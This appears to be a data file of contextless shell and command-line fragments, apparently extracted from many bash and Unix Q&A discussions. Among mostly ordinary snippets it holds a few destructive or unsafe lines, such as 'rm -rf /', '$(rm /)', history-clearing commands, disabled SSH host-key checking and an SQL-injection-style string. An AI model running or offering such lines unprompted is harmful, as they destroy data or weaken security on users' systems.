grep -lzZ ....
find ... -print0
xargs -0
rm -rf /etc/XXX.pid
ls -ltr | grep <date>
bash -x
-m 1
ssh user@host 'command'
cd $1
` or $() because I'd like to know if it's possible.
ssh myServer "uname -n"
CSUM1=$(CHECKSUM "$1" | grep -om1 '^[0-9a-f]*')
sed 's/^/^#/' | grep '.com' < hosts
grep '.com' | sed 's/^/^#/' < hosts
system("script_name &")
man cp
perl split_gen.py
make install
\e\c\h\o foo
? :
/etc/init.d/sshd stop
shopt -s globstar
for f in yourdir/**
man find
! -name something
sleep .5; kill -9 $(pidof some_process)
sleep .5; pidof some_process | xargs kill -9
man pidof
timeout -s SIGKILL 0.5s some_process
bash myscript
basename path/to/file.b.c
scp [tab]
scp alex@[TAB]
scp alex@[TAB]
$(cat file)
$(< file)
-exec rm "{}" \;
bull2flux: command not found
source path/to/software/bin/init.sh /dev/null
sed 's/<loc>/<loc>\n/g' | sed 's#</loc>#\n</loc>#g'
grep -v "<loc>" |grep -v "</loc>"
grep -v "$<"
paste random_number_file.txt string_data.txt > tmp_string_data.txt
sort tmp_string_data.txt > sorted_tmp_string_data.txt
cut -f2- sorted_tmp_string_data.txt > random_string_data.txt
sort -R
sort -R
pg_dump prod-db -U postgres > prod-db.sql
pg_dump prod-db -U postgres > prod-db-{date}.sql
ls /path/to/directory | md5sum
-type f
md5sum -c
Foo &
script.sh &
awk '$NF ~ /ms/{print $(NF-1)}' temp.txt
let g:is_posix = 1
let g:is_kornshell = 1
hg status
hg diff
echo $a
python -V
awk -vRS="" '...'
hadoop fs -mv URI [URI …] <dest>
hdfs dfs -mv
ifconfig -a
ifconfig -a
ifconfig -a
tr -s ' '
-F'[: ]'
{if (/^[a-z]/) ...
{if (/inet addr:/) ...
_inet addr_
ip addr
error while loading shared libraries: libirc.so: cannot open shared object file: No such file or directory
ls /lfs/data0/g_local/intel/composer_xe_2011_sp1.7.256/compiler/lib/intel64
echo $LD_LIBRARY_PATH
echo "This is test" | cut -f 1
This is test
GNU awk
ls ~/path
cat *.txt
rm ~/Pictures/Vacation*.jpg
./foo ~/path/*
.leaflet-right {
right: 0;
left: 0;
history -d 511
history -d
histdeln 10
history -c
history -r && exit
builtin history
for i in {1..10}; do history -d $(($HISTCMD-11)); done
history -d
rmhist 5
fork(), exec()
mv ...
-i ''
ls -al
ls -al
$0 in old{delete old[$0];next}
<(sort -u new.txt)
| sort
command emacs
command emacs
builtin emacs
help command
value = 200
value = $VAR
value = 200
value = $VAR
which kill
help kill
type -a COMMAND
vim -E
$ man sed
set -x
ls -l
ls -l | grep user1 | grep Aug
ls -l | grep 'user1.*Aug'
[[ $1 == A ]]
echo "A"
echo "not A"
crontab -e
man crontab
crontab -e
source get.exp
AllowOverride All
<Directory "/var/www/html">
test -f
sh: Syntax error: "(" unexpected
cat ../header.txt > find -name *.c
sed 's/^ *//g'
Disk Space
sort -u
wc -l
tail -n $file
tail -n +3 file
tail -n +3 file
man tail
git log
while read line
git svn clone
<?xml version="1.0" encoding="UTF-8"?>
set -e
set -e
set -e
: command not foundh: line 1:
: command not foundh: line 2:
od -xcb scriptname
od -xcb
tr -d '\r'
cat hello.txt | tr -d '\r' | od -xcb
python -i mycode.py
--arg option
should not get here
diff -r --brief Dir1 Dir2
$1 $2 $3
| cut -D: -f1
cat -
still more text
grep -n -m 3 -w "^XXX$" * | cut -d: -f2
char *argv[10] = { "/mnt/hgfs/F/working/script.sh", "file1", "file2", NULL  };
execve(argv[0], argv, NULL)
gcc -c ./main.c -o ./main.o
rc = -1
rc = -1
readarray data
cmd1 < <(cmd2 param1 param2 ...)
cmd2 param1 param2 ...
< [space] <(...)
< <
tail -n+3
printf "%s" param1 param2 ...
echo "\\"
grep "\\"
grep \
grep -F '\\'
grep '\\\\'
grep "\\\\\\\\"
echo "a\\b"
echo 'a\\b'
grep "\\"
echo 'a\\b' | grep "\\\\"
echo 'a\\b' | grep '\\'
echo 'a\\b' | grep -F '\'
echo 'a\\b'
basename $(pwd)
man stat
GNU sed
awk ...; print}' | tee fake.log
GNU awk
mkdir $HOME/hello/world
ls -l | grep ^d
cd ...
kill -9 PID
kill PID
shuf yourfile
join " "
join "\n"
$(TARGETS_$(d)/classes/player) $(TARGETS_$(d)/classes/monster)
#!/usr/bin/env bash
stty -a
stty tostop
stty -tostop
echo $a | grep -Po '(?<=demo-jms2;)[^;]+'
tr '\n' ','
id -u name
>/dev/null 2>&1
while loop
exec 2>&1 >/dev/null
$set_tty $launch_app
set_tty="openvt -c1 -s -w"
launch_app="my_daemon 2>'$HOME'/logfile"
openvt -c1 -s -w my_daemon 2>'$HOME'/logfile
exec 2>>"$HOME"/logfile
whois -> sed -> while (exit while) ->perform action
pipe | lines
$(command expansion)
<(process substitution)
(explicit subshells)
type somecmd
-e 'code'
<(echo 'code')
high-level comment
high-level comment 1
high-level comment
./test.sh 2
sed -i 's/ /NULL/g'  temp.txt
mkdir $HOME/folder123
chmod +x yourscript.sh
echo $PATH
mkdir /home/you/bin
export PATH="$PATH:/home/you/bin"
source .bashrc
diskutil list | grep /dev/
Sparse Directories Exclusion
insert-comment (M-#)
chmod +x /Users/myusername/Desktop/alert
launchctl list
launchctl list
The number of executable files in this dir is: 0
Lukas-mbp:~sub_directory(2603m|master) $
The number of files + folders
readlink -f ${BASH_SOURCE[0]}
readlink -f
env: bash: No such file or directory
echo this || echo that && echo other
true || true && true
more precedence
both are true
man bash
true || false
false && true
do_foo || do_bar_if_foo_fails
do_foo && do_bar_only_if_foo_has_succeeded
echo that
echo this
echo this || echo that
man bash
echo this || echo that
echo that
echo this
&& echo other
echo other
echo this
echo that
echo this
echo other
echo this || echo that
false && true
false; true
set -e
set -e
xyz > temp.log
-i ["${inputData}"]
cat <<<${variable}
wget -O-
bash -s
{printf $4}
$4 ~ /^2012.*/
condition { commands }
chmod +x autogen.sh
-o exec
ls -lh a.txt
stat -c %y a.txt
header('Content-Type: text/html; charset=UTF-8');
--dport ${i}_${j}_port_ext
--dport box0_http_port_ext
--dport $box0_http_port_ext
--dport ${${i}_${j}_port_ext}
--dport $(${i}_${j}_port_ext)
--dport $box0_http_port_ext
${ }
printf '%s\n' *_{email,phone}.txt | ...
ls *-...
ps -p $$
export PS1="\h:\W \u\$ "
read -e -p 'GET YOUR FILE: ' file
-u user
+d /home/
+d ~/home/
+d ~
-u me +d ~
grep -E
<(process substitution)
digest -a md5 -v /filename
"-n abc\n"
python -c 'import subprocess; subprocess.call(["echo", "-n", "abc"])'
man lftp
ls -rt | head -n 4
su - postgres | cat ...
su - postgres -c "cat ..."
for i in {1..n}
seq (1)
for i in $(seq 1 $number)
find -exec
cat | awk
if [[ "$1" = "-r" ]];then
if [[ "$1" == "-r" ]];then
GNU awk
declare -i SEK
declare -i
yourreader */*/*.ps
"! -f /filename"
-f /data/sb3????????sh25t.sqfs
ls foo
2>&1 > /dev/null
kill -2 pid
sleep 1h
source tmp.sh
sort huge-file | head
sort ... | head
split -l ...
sort ... | head
$ time sort -t^v<tab> -k2,2n foo* | tail -10000
$ time python test.py 10000 foo*
awk -v
awk "{ print ${$wordnum} }
echo $1|awk '{print($'$2');}'
crontab -e
shutdown -c
Controller.sh blue start
sudo taskset
bash -x
sudo taskset
bash -x
bash -x
set -u
set -u
bash -u myscript.sh arg1 arg2
sed "s/$1/pitt/g"
sed 's/'$1'/pitt/g'
sed 's/'"$1"'/pitt/g'
./script apache2 50 # max 50%
./script.sh 12345 50
app_cpu * 100
grep -v
eval "$(ssh-agent -s)"
ssh-add -l
ssh-add <pathToYourRSAKey>
exit 999
1 2 3
set -x
set -v
man bashdb
source /root/path/to/some/dir/script.sh
perl -npe 's/^[0-9]+//'
cut -d ' ' -f 2-
function add_ip_if_pings
man sed
:args **/*.php | argdo %s/(\$[a-zA-Z0-9]+\[)([^\]]+)\]/\1'\2'/ge | update
| sh
for line in $(file)
--passphrase-fd 0
--passphrase string
<(process substitution)
-a file
[ ... ]
test ...
type [
help [
man test
help [
help test
man test
( cmd ) &
echo system(telnet 10.10.1.2 1800)
echo system(telnet 10.10.1.2 1800)
echo system('./gpsdiag.sh');
2> /dev/null
echo "You now have $(find . -type f|wc -l ) files in your \"myScript\" folder"
-maxdepth 1
man proc
. foo.sh
ls -l /users/Thomas/desktop
ls > ~/FILE.txt
echo "$HOME"
ls -t
ls --sort=time
bash script
perl myperl.pl < yourdata
$~ mkdir ~/myrm
$~ cd ~/myrm
$~ ln -s /path/to/remove rm
$~ chmod 0777 rm
$~ PATH=~/myrm/:$PATH
[ -n ]
[ -z ]
$0 ~ interface_name
$ python parse_input.py "1\n2\n"
`data = "1\\n2\\n"
e f g
set -f
screen -dmS name
C-a {
history -w [filename]
history -r [filename]
Ctrl+a c
Ctrl+a Ctrl+c
error: pathspec 'Q2,' did not match any file(s) known to git.
shift n
bash t.sh 1 2 3 4 5
line 43
bash script
mac osx
<?xml version="1.0" encoding="utf-8"?>
* */2 * * *
man crontab
random="whatever h45
egrep -o ="([a-z]*[A-Z]*[0-9]*[ ]*)+'
="whatever h45
whatever h45
="whatever h45
cat | command1 | command2 | command3
-eq 0
if foo $arg; then ..; fi
bash -c "bash -c 'bash -i -l' &"
bash -c "bash -i &"
bash -c 'strace -o bash_trace.txt bash -i &'
git replace
find ... -exec ... +
set +H
ampersand &
'single quotes'
set -e
set -e
set -o pipefail
sed -rn 's/.*-([0-9]{4})$/\1/p'
scp -r
rsync -r -v -e
-o filenames
ls -al
cd loourr
cd ..
ls -al
echo $CDPATH
ls -a
awk: line 1: syntax error at or near :
users | awk '{ print \"Number of Users:\", NF }'
echo " "
GNU awk
#Enable user's Public HTML directories
( record1_fieldA record1_fieldB record2_fieldA record2_fieldB ... )
DEBUG echo "test"
echo "test"
set -x
set +x
DEBUG echo 'Reading files'
Reading files
echo Reading files
set +x
man bash
pwd -P
( ... )
{ ... }
lcmd cat ../hello.py
GNU awk
echo myprogram.c -o myprogram -llibrary | ./Compile
./Compile < myprogram.c -o myprogram -llibrary
exit 0
source this_file
... && set this_file=($_) && bash -c "$this_file; bash" && ...
... && bash -c ""$_"; bash" && ... 
bash -c "source" "this_file" "; bash"
... && bash --login -c "$_; bash" && ... 
bash -c "source this_file; bash"
bash -c 'cmd'
bash -c 'echo $@' arg0 1 2 3 4 5
diff -qr /source/dir/ /target/dir/
<(echo abcd)
<(echo abcd)
for loop
-gt, -lt...
shopt -s lastpipe
./application 'channels;message'
./application -m "this is a message" channel1 channel2 channel3
./application -m "this isn"t a message" channel1
-n count
-c count
if [ $? -eq  4.189 ];
if [ $? =  4.186 ];
wget -O $HOME/Music/YoutubePlaylist/output$begin.txt $url 2>&1
cat output1.txt > output.txt
grep '/Message.class$'
echo $x
| sh
if ... else
echo "arg:"
rm fileA fileB fileC fileD ?...
set -o vi
find local_dir -type d
Unix pipe
ssh remote 'remote_command'
while read a; do mkdir -p remote_dir/$a; done
mkdir -p
eval [arguments]
date +%s
current_timestamp=$(date +%s)
date +%s
fofo -b -a -r
/foo /bar /baz
man zenity
FALSE $(cat tmp3)
--column "Playlists" $(sed s/^/FALSE\ / tmp3) \
paplay <file> &
M-x compile
make && ding
nohup paplay ... &
'FOO' OR 'BAR' OR 0=1
while (<>) {}
if the EOF is not reached
ls -l
/sys/class/net/<device name>/...
"YYYY-MM-DD HH:MM:SS"
set -e
mysqldump databasename table1 table2
echo $PATH
man expr
sqlite3 -echo something.db < some.sql
< some.sql
cat some.sql
what does some odd looking string in the output do?
find . -name AdbeRdr\*.exe | sort -n | tail -1
SSH session
> ./log/my_log.log
[\u] \w \n\[\033[0;31m\]$\[\e[0m\]
(myproject)[\u] \w \n\[\033[0;31m\]$\[\e[0m\]
if [[ ... ]]
foo bar
cp -f
chmod 0000
while IFS=read -r line;
while read -r line;
tail -f
getevent > output
echo VAR=42 >> ~/.myvars
echo $VAR
source script
find -type d
scons -c
find /path -name '*' -type f -exec dos2unix {} \;
find /path -type -f -exec dos2unix '{}' \;
man rename
c3 b6
6f cc 88
env DISPLAY=:0.0 xeyes
export DISPLAY=:0.0; xeyes
--text=thing with spaces in it
ifconfig lo
awk 'NR==1' RS=''
awk '$1=="eth0"' RS=''
ifconfig eth0
ifconfig lo
${parameter/pattern/string} 
PVM_RSH="/usr/bin/ssh -v "
echo "xxx\nxxx\n"
echo "xxx\x1BExxx\n"
bash builtin
for file
for file in "$@"
script.sh somedir
bash --version
perl's rename
-dp -1
man find
-type f
find /your/target/path/ -execdir rename 's/special/regular/' '{}' \+
find /your/target/path/ -execdir rename 's/special/regular/g' '{}' \+
brew install rename
rename from util-linux 2.23.2
find . -type f -exec rename mariadb mariadb-proxy '{}' \;
echo $PS1
echo $(( 22/7 )) | bc -l
echo $(( 22/7 ))
GNU awk
${"CONTENTS OF $3"}
testing a b
echo ${$i}
bash: syntax error near unexpected token ('
ls -t
tail -n +7
git init
git init
git init
man gitignore
echo 20000024ff3dbf50 | sed 's/\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)\(..\)/\1:\2:\3:\4:\5:\6:\7:\8/'
sed 's/\r//' file > file.new
OUTPUT=""yum update
echo $OUTPUT
echo $OUTPUT >> mylogfile
yum update
file1.txt file2.txt
clamscan file1.txt
man bash
"$1" "$2"
${@/ /\\ }
echo "CONT: $VAR"
-f  filename
awk '{print $1}'
sed -i
<line_num>:<matched line>
(-gt, -lt)
lines 1,3 or 2,3 or 4
cat text |
echo $(echo "line"; cat text; echo "line")
A1, A2.. B1, B2..
GNU bash, version 3.00.16(1)-release (i386-pc-solaris2.10)
chmod 755 "$dir"
echo "$dir"
bash --version
regular expression
line ends in number
end-of-line anchor
git rebase
git rebase
< X.csv
111,048 people 10:43:54 PM Feb 22 2013
There are currently 42823 people playing!
set -x
let "ODDEVEN+=1"
let "ODDEVEN-=1"
dpkg -l
[unit ...]
GNU sed
+ 10lines
command1 | command2
command1 | command2
findag filename.py "some word"
ack-grep "some word"
logger -t SRI some message
word 1
word 2
time diff
SkiAddict's Mac
cd /Volu...
echo "0=0" > /dev/pi-blaster
major=$( .. )
GNU awk
PROJECT_ROOT = $(shell pwd)
$(shell pwd)
touch output.txt
post_max_size = 8M
post_max_size = 32M
git commit
git push
git pull
while read
grep -o \w*
(( ))
[ $something -eq 0 ]
[ x$something = x0 ]
man expr
let ...
declare -i
grep "\."
grep -v "\."
ls testfiles | grep "^[^.]*$"
set -xv
exec 5>&-
<(some command)
<(yes violet)
exec 5< <(yes violet)
<(exec yes violet)
GNU date
date +%W
ps f
sh -c ...
sh -c { ./c.sh; }
print open('./test2.sh').read()
Peer authentication failed for user "string_agg"
find putty -type f -name '*.c' -printf "%h\t%f\t%s\n" | column -t
tail -f
ln -s /private/var /var
ls /private/var
var -> private/var
ssh $DOMAIN -l root "grep "'$EMAIL@$DOMAIN'" /var/log/maillog | grep retr= | grep -v retr=0 | awk '{ print "'$11'" }' | cut -d, -f1 | cut -d= -f2 | awk '{ t += $1 } END { print "'total: '", t, "' bytes transferred over POP3'"}'"
awk '{ t += $1 }
zip -r backup Desktop/* Documents/* Pictures/*
-o SendEnv=YOURVARIABLE
find ...
-bash: /Users/Jesse/Desktop/Dropbox/dev/ourcityourstory.com/js/script.js-lint.txt: No such file or directory
./script.sh foo *.txt
find /$1 -name "$2" | wc -l
echo $2
ssh root@ClusterB 'bash -s' < local_ClusterA_script.sh
ssh root@ClusterB 'bash -s' < run.sh $MYARGS
filelocation=$(locate forloopvariable)
bash benchmark.sh
sed -n 1p
sed '1{p;q}' uopgenl20121216.lis
read foo < uopgenl20121216.lis ; export foo; echo "$foo"
sed -n '1{p;q}
10000000,10000001,10000002, ...
1 -> 1,2 -> 1,2,3 -> 1,2,3,4
while... read ...
bash script
echo ${!temp_type}
$end_time may
[$start_time, $end_time]
schwartzianTransform "A.txt" 2 0 1
$safe = quotemeta $foo; /$safe/
perl -ne'$var = "..."; print $p if /\Q$var/; $p=$_'
uniq -c
ps -L u n | cut -f 1,2,13
ps -L u n | tr -s " " | cut -d " " -f 1,2,13
ps -L u n | tr -s " " | cut -d " " -f 2,3,14
tr -s
s/ .*\([0-9][0-9.]*[0-9]\)/\1/
(.*) (\[[0-9]+\]) (.*)
 cat id1.txt | while read id; do grep "$id" id2.txt; done 
grep -F
... > my_new_course
cmd "my args"
myargs="\"my args\""; cmd $myargs
rm -rf /
\[ ... \]
cat file | perl -ane '$h{ $F[0] } += $F[1]; END { for ( sort keys %h ) { printf qq[%s %d\n], $_, $h{ $_ } } }' | sort -k2 -n -r
awk '{A[$1]+=$2;next}END{for(i in A){print i,A[i]}}' file | sort -k2 -n -r
Course Number
Status (0 or 1)
Grade (A,B,C,N/A)
sed -i "/CSC$cNum/ s/.,[^,]*$$/$status,$grade/"
MySQLQuery 'SELECT * FROM kunden;'
echo "$1"
mpc add
mpc insert
$(( ... ))
source ~/.bashrc
['./command.py', 'a', 'b', 'c']
['./command.py', 'a', 'b c']
\zs, \ze
:help /\1
find <expr> -exec printf '.' \; | wc -c
find -> wc
aa -- bb
bb -- aa
sort -k1,2 -u -t[
sed ...
\ln ...
lns ...
ln -s ...
CONVERTED=$(date -d "${Year}-01-01 +${JulianDay} days -1 day" "+%Y%m%d")
"[ ]"
" "
foo bar
foo  bar
if test check_log
if test -n check_log
S - {x}
oauth_token secret
-maxdepth 1
echo $opt | sed "s/\"//g"
MESSAGE23="com."apple".cacng.tokend is present"
MESSAGE23="com.\"apple\".cacng.tokend is present"
MESSAGE23='com."apple".cacng.tokend is present'
echo "$MESSAGE23"
/bin/sh -c $'nice /usr/bin/ffmpeg -i \044'\'$'/home/user/videos/awaiting_conversion/video_file_1.mp4'\'$' -s \044'\'$'480x320'\'$' -vcodec libx264 -acodec libmp3lame -ab \044'\'$'64k'\'$' -vpre fast -crf \044'\'$'30'\'$' -ar \044'\'$'22050'\'$' -f flv -y \044'\'$'/home/user/videos/converted/video_file_1.flv'\'$''
./script.sh /home/user/videos/converted/video_file*.mp4
./script.sh /home/user/videos/converted/video_file_01.mp4
find /home/user/videos/converted -type f -name '*video*mp4' |./script.sh
-D_WEBSOCKETPP_CPP11_STL_ -D_WEBSOCKETPP_NO_CPP11_REGEX_ -lboost_regex -lboost_system
`expr 2 \\* grep -c ",2,1," my_course
"expr: non-integer argument"
grep ...
see '/^\$userinput/d'
$ df -lak /
df / | tail -n +2 | awk '{ print $1 }'
set -xo
source file_with_completion
Buy value
./myscript.sh directory "regex"
-regextype posix-extended
newgrp - your_group
newgrp your_group
newgrp - ...
newgrp ...
id -gn
newgrp different_group_name
load data local infile
load data local infile [...] escaped by ''
echo $first
echo $second
this is a line containing a keyword
this is a line containing someoneelseskeyword
printf %s "$(pwd)" | xsel -i
pwd | head -c -1 | xsel -i
echo "${my_array[@]}" | tr ' ' '\n'
set -vx
hash -r
GNU grep
curl ...
"${LOG_FILE:=}x" != "x"
Sun, ...
sun, ...
grep -f lookup_file
sort -m
grep -f
$ ./deepfind lookup.txt pattern.txt
python script.py lookup patterns
fc -l $2 $2
wget -O/dev/null --secure-protocol=sslv3 https://myHost:8443/inst/openid_login.html && echo Aggregate instance is UP || echo Aggregate instance is DOWN
ls -R
curl ftp://yourftpserver/dir/ --user username:password
ncftpls ftp://yourftpserver/dir/*.pdf
man ncftpls
stty -f /dev/tty.usbserial-A5002TeW speed 9600 cs8 cread clocal
stty -f /dev/tty.usbserial-A5002TeW raw speed 9600 -cstopb -parity -echo
echo $'LE 100\cM\cJ' > /dev/tty.usbserial-A5002TeW
awk '{s+=$1}ENDFILE{print FILENAME,s/FNR;s=0}' RS=" " file1 file2
echo $USERPROFILE
echo $PROGRAMFILES
C:\Program Files (x86)
echo $PROGRAMDATA
var1=QRS; var2='ABC'$var1'XYZ'
var1=QRS; var2='ABC'"$var1"'XYZ'
lynx -dump
ERL_OPTS=" $ERL_DIST_PORTS -smp auto +P $MAX_PROCESS +A 16 +K true @ERL_OPTS@ "
bash -c
./ipcheck: line 16: printf: 134[*]: invalid number
tmux send-keys
$1 $2 $3 …
"ls -ltr"
ls -ltr
tmux send-keys
"$1 $2 $3…"
"$1" "$2" "$3" …
USER="Tam O'Shanter"
USER='Will "O'\''Wisp" Light'
echo "$USER" | ...
fetchmail -d 1800
A AA AAA AAB AB ABA ABB ... BB BBA BBB
rsh -l user machine "echo "PORTS = 123|456|789" >> conf.cfg"
bash: 456 >> conf.cfg: No such file or directory
bash: 789: command not found
PORTS = 123|456|789
-c <command >
--rcfile <file path>
ls -Al output
ls -Al
ls -Al | <something>
ls -Al
ls -R
ls -Al |awk '{$1=$2=$3=$4=$5=$6=$7=$8="";print $0}'
ls -Al
until [ $second_num -ne 0 ]; do
if [ $first_num -ne 999 && $second_num -ne 999 ]; then
set -H
set +H
/usr/bin/sort -n db | /usr/bin/awk -F: '{print $1; print $2}' | db5.1_load -T -t hash newdb
export COLUMNS
ls -Cw $COLUMNS
Line 4 :
echo "Ho ho ho"
echo `echo "Ho ho ho"`
a=08;  ((a++));  echo "$a"
bc <<< "08+01"
echo $(expr "$a" + 1)
echo $((10#$a+1))
a=$(expr "$a" + 0)
sort -u
ps -p $$
sudo nano /etc/bashrc
touch ~/.zshrc
; clear
source ~/.bash_profile
chsh -s /bin/bash
cat /etc/shells
echo $SHELL
chsh -s /bin/bash
echo $SHELL
"ls *"
$(ls *)
echo: bad interpreter: No such file or directory
groups rommi
bad interpreter: No such file or directory
-bash: command not found
new-host:~ Home$ echo $PATH
-bash: XXX: command not found
-bash: dvm: command not found
cat /etc/profile
help printf
grep( /pattern/ @array)
set -u
set -u
declare y1= y2= y3=
int i, j, k;
declare y1= y2= y3=
declare -p
declare -a var
declare var=
ls -d
ls -d
ls -d *
ls -d */
ls -d *
ls */
if [-f "${file_root}"] then
pkill -f
pkill -f $DAEMON
(shift; p "$@")
iostat -xnmp
read -p
echo -n "Your prompt" && sed 1q
exec 0< /dev/tty
$2 = *[[:digit:]]*
-k 8
[ ]
thisDir echo
$($2) $line
$2 $line
while read ... done < $(ls $1)
while read ... done < <(ls $1)
./myscript thisDir "cat -v"
"cat -v"
./myscript thisDir cat -v
./myscript thisDir grep -m1 "pattern with spaces"
IFS=$'\n' set $(echo hello hello; echo world world)
$( ... )
echo -n "\"filename\" "
read foo; ls $foo
$(rm /)
"foo bar"
{} +
readonly FOO=bar
typeset -r
readonly foo=function
typeset -r bar=function
typeset baz=function; readonly baz
qux=function; readonly qux
quux=function; typeset -r quux
readonly x
readonly x
readonly foo=function
typeset -r
typeset -r bar=function
typeset baz=function; readonly baz
qux=function; readonly qux
quux=function; typeset -r quux
typeset -r
function bar
typeset -r
f() ( <code> )
f() { <code> }
"readonly <var>"
"declare -r <var>"
sed 's/[][{}()]//g'
cd some-repo; git push origin master
git push origin master
Usage: git credential-osxkeychain <get|store|erase>
sort -t
< file
"Select username from usertable"
perl -pe
v $lineNumber
ls tRap*primary.txt
syncfolder $foldername
syncfolder $foldername
function syncfile()
last > login.txt
last | awk '{print $3}' | sort -u > names.txt
grep "line1" login.txt | wc -l
man wtmp
echo $CERT
./simple.sh /home/test
tail -n 1 -q
Apr 1
help declare
-atime +60
gmake clean
gmake clean
gmake clean
gmake clean
gmake clean
gmake clean
gmake clean
"/home/bar/baz1.sh /home/bar/baz2.sh /home/bar/baz.conf"
for i in myArray;
if   myArray[$i]="$NOME" ;  then
[[ ]]
cp ./* "backup_$timestamp"
cp -r
man bash | less +/'Here Documents'
-bash: line 2: EOF: command not found
"qsub -v argv="
" -l walltime=10:00:00 -l vmem=8GB -l nodes=1:ppn=4 /myscript_path/run.script"
Ubuntu 12.10
Key: Value
Key: Value
split /:\s*/, $_
split /:\s*/, $_, 2
(split /:\s*/, $_, 2)[1]
[expr {2+3}]
string map
/usr/local/bin is in your $PATH
secure path
node -v
npm -v
zsh: command not found: npm
~ sudo nano ~/.zshrc 
export PATH="$PATH:/home/myLaptopName/.nvm/versions/node/v17.0.1/bin" 
node -v
whereis node
un:dodecaedro:per:tirare:per:i danni
i danni
man (1) bash
find … | xargs
cat <someinput> | xargs -I{} sh -c 'echo {}; <somecmd>;'
sh -c
export TEST="sdfsd"
system($PROG, @ARGS)
[[ ]]
[[: not found
help test
[ ... ]
[ ... ]
[ ... ]
[[ ... ]]
[[ ... ]]
[ ... ]
AuthorFirstName AuthorLastName Title XX.pdf
AuthorFirstName AuthorLastName title
appcmddate| sed -n 2p | cut -d \  -f 3,4,5,6,8
ssh ... | sed | ...
ssh (... | ...)
man bash
echo "Hello world!"
sed -e "s/'/'\\\\''/g; 1s/^/'/; \$s/\$/'/"
sed -e 's/./\\&/g; 1{$s/^$/""/}; 1!s/^/"/; $!s/$/"/'
LC_ALL=C sed -e 's/[^a-zA-Z0-9,._+@%/-]/\\&/g; 1{$s/^$/""/}; 1!s/^/"/; $!s/$/"/'
print '%q'
file <- OpenRead(file)
wc -l file
{ P; D; }
wait $PID
trap handler INT
trap '' SIGINT
trap -- '_set_SIGINT_RECEIVED' SIGINT
StrictHostKeyChecking no
su - $USER
xargs md5sum
rsync -c
rsync --checksum
rsync -Pahn --checksum /path/to/source /path/to/destination | sed '/\/$/d' | tee migration.txt
tr -d "[:space:]"
if new rule # is found in $1:
.date +"%Y%m%d.%H%M%S"
(date command)
for  i in $*
sudo gem install bundler
$ which bundle
$ sudo -u git bundle
sudo -i -u git bundle
sudo -u git bundle
man 7 signals
someCommand > log.txt 2>&1
someCommand 2>&1 > log.txt
someCommand > log.txt 2>&1
someCommand 2>&1 > log.txt
fd(1) == stdout
fd(2) == stderr
fd(1) == log.txt
fd(2) == fd(1) == log.txt
fd(1) == stdout
fd(2) == stderr
fd(2) == fd(1) == stdout
fd(1) == log.txt
while (<>) { }
-e ''
mplayer http://66.225.205.192:80
perl extract.pl 2
while read line ...
alias nreload='/usr/local/nginx/sbin/nginx -s reload'
source ~/perl5/perlbrew/etc/bashrc
source ~/perl5/perlbrew/etc/bashrc;
echo | while ...
while ... done <<<$PATHS
ps -o etime, user, cmd
ps a -o ...
bash ./mytest.sh 5 bash
rm -rf
alias rm='/root/remove.sh'
#rm test_file
mv $dir/$1 /root/Recyclebin
mv:cannot move '/root/test_file' to '/root/Recyclebin': Not a directory
alias rm='mv -t /root/MyTrash/'
source .bashrc
[[ ... ]]
2>&1 | tee -a file_name.log
cat <log message here> >> custom.log
master script runner
file path:line
set +o noglob
AAA BBBB
jobs -p
integer expression expected
<Notes />
b a
<Notes />
/<Notes \/>/
grep -c 'function (' code.c
mv -R
declare -x
typeset -ax a=(1 2 3)
typeset -p
typeset -n
echo $var
tmp="$($line | awk '{print $1}')"
echo $line | awk '{print $1}'
my_script *
$(ls -d directory_a)
*/.txt */.xml
shopt -s nullglob
echo $HOSTNAME
dpkg-reconfigure dash
wc -l
split -l 1000000 $IN_FILE
python -c
python -c
svn co
svn update
export var=defaultVal456
sort -k2 | uniq -f1 --all-repeated=prepend | grep "^$" -A3
uniq -f1
uniq -f1 --all-repeated=prepend
uniq -f1
fieldA fieldZ
ps -ef
"one tswo three"
man bash
npm install bower -g
-bash: bower: command not found
which npm
which node
export PATH=/usr/local/share/npm/bin:$PATH
npm install bower -g
sudo npm install bower -g
export PATH="$HOME/.node/lib/node_modules/bower/bin:$PATH"
source ~/.bash_profile
export PATH=<yourNodeBinLocation>:$PATH
source ~/.bash_profile
bash -x test.sh
[[ ]]
'{"name":"$3",' '"description":' '"$4"}'
[ some-condition ]
test some-condition
GNU sed
trap 'function' DEBUG
cd /var/spool/vmail/domain.com/account/Maildir; mv * ..
stat -c %s filename.ext
for dir in $(ls)
for dir in $(ls -l)
a b c
sed -i "s/$(whoami)//g" .htaccess
sed -i (inline sed, do actions directly on file) "s/find_this/replace_with_this/" (search and replace)
sed -i "s/~\/$(whoami)//g" .htaccess
diff -u .htaccess{.bak,}
/# &\n...
a b c
while read line
This is two
One "This is two" Three
typeset -F
Bash 4.1
_completion_loader docker
grep defined
shopt -s globstar
sudo rvm install
rvm use 1.9.3
-bash: rvm: command not found
rvm -v
unzip -l
0  2013-04-07 12:18   dartium-lucid64-inc-21033.0/
{print p+1 "-" $1-1}
gaps file
paste  <(echo; numinterval file) file
[ ]
if [ $x == 3 ]; then
[ ]
man test
set -xv
$foo="whose value is this"
bar=whose value is this"
set -xv
set +xv
(( … ))
PATH=$PATH:/home/william/.rvm/bin && . /home/william/.rvm/scripts/rvm
sudo gem install cocoapods
pod setup
~$ gcc -Wall -std=c99 program.c && ./a.out && echo $?
~$ ./a.out && echo $?
echo $?
shopt -s nullglob
echo $PATH
echo $PATH
export PATH
echo $PATH
export PATH=/Applications/SenchaSDKTools-2.0.0-beta3:$PATH
sudo pico /etc/paths
echo $PATH
export PATH=""
export PATH="/path/you/want/to/keep"
export $PATH
new=$(echo $output)
set -- $output
source bin/activate
alias acfx='cd ~/src/devtools/addon-sdk && source bin/activate && cd "$(dirname "$0")"'
$(dirname "$0")
dirname bash
cd -
export PATH=~/src/devtools/addon-sdk:$PATH
'here document'
test="this is a string string"
finger | awk '{$1=$4=$5=$6=$7=$8=$9=$10=""; print}' | tail -n +2
date +%b" "%d" "%H
? :
sudo apt-get install bash-completion
export PS1='$(__git_ps1) \w\$ '
source .bashrc
export PS1="\u@\h \W\[\033[32m\]\$(parse_git_branch)\[\033[00m\] $ "
source .bashrc
ln -fs
$(echo ...)
$(eval ...)
$(echo )
$(eval ...)
`echo '
$(eval ...)
$(shell xxx)
ls -ld ~/Documents
GNU locate
mdfind -name
Minecraft: $minecraftsize...$minecraftunit
birth time
ls -lc
mvn clean
mvn clean
awk -F: '$0=$3'
unset var[1]
unset -v 'var[1]'
-i '~'
echo $time | grep -oE "[^:]+$"
--username email@address.com
su sh -x script
cat script
source ~/.bashrc
No such file or directory
Too many arguments
print 1
print 0
